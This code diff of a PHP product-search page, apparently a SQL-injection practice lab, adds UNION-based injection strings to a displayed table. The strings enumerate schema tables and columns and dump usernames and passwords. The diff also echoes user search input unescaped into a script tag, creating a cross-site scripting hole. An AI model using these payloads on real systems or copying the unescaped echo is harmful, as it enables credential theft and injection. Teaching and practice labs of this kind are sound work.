@@ -13,7 +13,7 @@
 			<h1> Product Search </h1><br>
 			<div class="row w-70 mx-auto">
 				<div class="col-sm-10">
-					<input type="text" class="form-control input-lg f-25" name="search">
+					<input type="text" class="form-control input-lg f-25" name="search" id="search">
 				</div>
 				<button type="submit" class="btn btn-primary col-sm-2 f-25">Search</button>
 			</div>
@@ -32,7 +32,10 @@
 						<td> --	' UNION(SELECT TABLE_NAME, TABLE_SCHEMA,3 FROM information_schema.tables);-- </td>
 					</tr>
 					<tr>
-						<td> --	' UNION(SELECT *, 3 FROM password);-- </td>
+						<td> --	' UNION(SELECT COLUMN_NAME, '2', 3 FROM information_schema.columns WHERE TABLE_NAME='password');-- </td>
+					</tr>
+					<tr>
+						<td> --	' UNION(SELECT password, users, 3 FROM password);-- </td>
 					</tr>
 				</tbody>
 			</table>
@@ -74,6 +77,7 @@
 							";
 						}
 					}
+					else $search = '';
 				?>
 			</tbody>
 		</table>
@@ -83,3 +87,7 @@
 </html>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script>
+  document.getElementById('search').value = "<?php echo $search ?>";
+</script>
